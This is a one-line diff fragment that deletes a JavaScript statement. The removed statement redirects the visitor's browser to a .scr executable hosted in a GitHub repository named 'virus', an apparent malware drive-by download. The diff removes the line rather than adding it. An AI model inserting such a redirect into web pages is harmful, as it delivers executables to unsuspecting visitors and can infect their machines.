@@ -1,1 +1,0 @@
-window.location.replace("https://github.com/manashma/virus/raw/main/manifist.scr");
